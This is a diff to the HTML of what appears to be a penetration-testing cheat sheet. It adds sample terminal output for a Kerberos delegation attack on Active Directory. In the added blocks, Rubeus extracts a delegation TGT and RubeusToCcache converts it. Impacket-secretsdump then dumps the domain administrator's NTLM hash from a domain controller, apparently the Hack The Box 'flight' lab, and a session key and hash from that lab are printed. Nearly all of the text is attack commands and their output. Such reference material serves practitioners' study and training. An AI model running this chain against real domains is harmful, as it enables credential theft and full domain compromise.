@@ -338,6 +338,31 @@ body.dark-mode #dynamicFormContainer button:hover {
 <button data-tabset="set1" data-tabcontent="tab1" class="active">Windows</button>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe tgtdeleg /nowrap /ptt
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\rubeus.exe tgtdeleg /nowrap /ptt
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">   ______        _                      
+</span></span></span><span class="line"><span class="cl"><span class="go">  (_____ \      | |                     
+</span></span></span><span class="line"><span class="cl"><span class="go">   _____) )_   _| |__  _____ _   _  ___ 
+</span></span></span><span class="line"><span class="cl"><span class="go">  |  __  /| | | |  _ \| ___ | | | |/___)
+</span></span></span><span class="line"><span class="cl"><span class="go">  | |  \ \| |_| | |_) ) ____| |_| |___ |
+</span></span></span><span class="line"><span class="cl"><span class="go">  |_|   |_|____/|____/|_____)____/(___/
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  v2.3.2 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: Request Fake Delegation TGT (current user)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] No target SPN specified, attempting to build &#39;cifs/dc.domain.com&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Initializing Kerberos GSS-API w/ fake delegation for target &#39;cifs/g0.flight.htb&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Kerberos GSS-API initialization success!
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found the AP-REQ delegation ticket in the GSS-API output.
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Authenticator etype: aes256_cts_hmac_sha1
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Extracted the service ticket session key from the ticket cache: W4jpmQuUqxCWpBh7QpPEkePICUi1mU/91EaqO2SfUgs=
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Successfully decrypted the authenticator
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi):
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIFVDCCBV ...[SNIP]... lHSFQuSFRC
 </span></span></span></code></pre></div></div></p>
 <h4 id="2-secrets-dump">2. Secrets Dump</h4>
 <p>
@@ -346,10 +371,31 @@ body.dark-mode #dynamicFormContainer button:hover {
 <button data-tabset="set2" data-tabcontent="tab2" >Windows</button>
 
 <div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><h4 id="1-convert-kirbi-to-ccache">1. Convert kirbi to ccache</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 rubeustoccache.py &lt;BASE64_TICKET&gt; secrets.kirbi secrets.ccache
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 rubeustoccache.py &#39;&lt;BASE64_TICKET&gt;&#39; secrets.kirbi secrets.ccache
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python3 rubeustoccache.py <span class="s1">&#39;doIFVDCCBV ...[SNIP]... lHSFQuSFRC&#39;</span> secrets.kirbi secrets.ccache
+</span></span><span class="line"><span class="cl"><span class="go">╦═╗┬ ┬┌┐ ┌─┐┬ ┬┌─┐  ┌┬┐┌─┐  ╔═╗┌─┐┌─┐┌─┐┬ ┬┌─┐
+</span></span></span><span class="line"><span class="cl"><span class="go">╠╦╝│ │├┴┐├┤ │ │└─┐   │ │ │  ║  │  ├─┤│  ├─┤├┤ 
+</span></span></span><span class="line"><span class="cl"><span class="go">╩╚═└─┘└─┘└─┘└─┘└─┘   ┴ └─┘  ╚═╝└─┘┴ ┴└─┘┴ ┴└─┘
+</span></span></span><span class="line"><span class="cl"><span class="go">              By Solomon Sklash
+</span></span></span><span class="line"><span class="cl"><span class="go">          github.com/SolomonSklash
+</span></span></span><span class="line"><span class="cl"><span class="go">   Inspired by Zer1t0&#39;s ticket_converter.py
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Writing decoded .kirbi file to secrets.kirbi
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Writing converted .ccache file to secrets.ccache
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] All done! Don&#39;t forget to set your environment variable: export KRB5CCNAME=secrets.ccache
 </span></span></span></code></pre></div><h4 id="2-secrets-dump">2. Secrets Dump</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">export KRB5CCNAME=secrets.ccache
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-secretsdump -k -no-pass -just-dc-user administrator
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>secrets.ccache
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-secretsdump &lt;TARGET&gt; -k -no-pass -just-dc-user administrator
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s g0.flight.htb <span class="o">&amp;&amp;</span> impacket-secretsdump g0.flight.htb -k -no-pass -just-dc-user administrator
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span></span><span class="line"><span class="cl"><span class="go">Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
+</span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Cleaning up..
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/SolomonSklash/RubeusToCcache">RubeusToCcache</a></em></small></p></div>
 
 <div class="tabcontent" data-tabset="set2" data-tabcontent="tab2"><h4 id="1-to-do">1. TO-DO</h4>
